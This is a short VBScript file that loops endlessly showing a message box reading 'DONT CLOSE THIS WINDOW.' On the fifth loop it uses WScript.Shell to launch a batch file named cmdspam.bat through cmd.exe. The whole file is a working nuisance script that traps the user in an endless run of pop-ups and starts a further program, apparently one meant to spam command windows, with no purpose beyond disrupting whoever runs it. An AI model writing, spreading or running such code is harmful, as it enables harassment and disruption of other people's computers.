msg = "DONT CLOSE THIS WINDOW."
count = 0

Do
    MsgBox msg, vbOKOnly + vbInformation, "Info"
    count = count + 1

    If count = 5 Then
    Set sh = CreateObject("WScript.Shell")
    sh.Run "cmd.exe /c start """" cmdspam.bat", 1, False
    End If
Loop
